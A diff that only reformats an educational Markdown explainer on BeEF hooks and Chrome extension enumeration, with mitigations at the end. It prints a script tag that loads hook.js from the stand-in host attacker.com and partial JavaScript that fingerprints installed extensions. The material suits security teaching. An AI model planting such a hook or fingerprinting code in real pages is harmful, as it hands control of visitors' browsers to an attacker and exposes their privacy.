@@ -1,4 +1,6 @@
-## BeEF (Browser Exploitation Framework)
+<br>
+
+# BeEF (Browser Exploitation Framework)
 BeEF (Browser Exploitation Framework) is **a penetration testing tool that focuses on browser vulnerabilities and client-side exploitation**. It is often used to assess the security posture of web browsers and applications. A BeEF hook enables an attacker to control and manipulate a hooked browser remotely after the victim visits a malicious or compromised web page.
 
 ## 1. What is a BeEF Hook?
@@ -9,10 +11,12 @@ BeEF (Browser Exploitation Framework) is **a penetration testing tool that focus
     - Through XSS (Cross-Site Scripting) vulnerabilities.
     - Via social engineering (e.g., phishing pages).
 
-### Basic Example of a Hook Script
+### Basic Example of a Hook Script  
+
 ```
 <script src="http://attacker.com/hook.js"></script>
 ```
+
 When the victim loads this script, the browser gets “hooked,” and the attacker gains control.
 
 
@@ -27,7 +31,8 @@ Once a browser is hooked using BeEF, the **attacker can gather various details, 
 
 ### How Chrome Extensions Work
 - Chrome extensions are installed in the browser and are typically loaded as a Chrome extension URL.
-- Example of a Chrome extension URL:
+- Example of a Chrome extension URL:  
+
 ```
 chrome-extension://<extension-id>/<file-path>
 ```
@@ -40,7 +45,8 @@ chrome-extension://<extension-id>/<file-path>
 ## 4. Example BeEF Module: Enumerating Extensions
 Using BeEF, an attacker can leverage the “Get Chrome Extensions” module, which attempts to detect popular Chrome extensions by loading known resource paths.
 
-### Example Code to Enumerate Extensions
+### Example Code to Enumerate Extensions  
+
 ```
 var extensionIds = [
   "aapocclcgogkmnckokdopfmhonfmgoek", // Example extension ID
@@ -100,5 +106,5 @@ extensionIds.forEach(function(id) {
 | Implications | Privacy exposure, targeted attacks, and bypassing security extensions. |
 | Mitigation | Avoid untrusted sites, patch XSS, enforce CSP, and limit extension usage. |
 
-
-**The BeEF hook is a powerful tool for browser exploitation, enabling attackers to enumerate Chrome extensions and gather critical information**. By understanding how BeEF works and employing strong web security practices—like input sanitization, CSP policies, and careful use of extensions—users and developers can defend against these attacks.
+**The BeEF hook is a powerful tool for browser exploitation, enabling attackers to enumerate Chrome extensions and gather critical information**. By understanding how BeEF works and employing strong web security practices—like input sanitization, CSP policies, and careful use of extensions—users and developers can defend against these attacks.  
+<br>
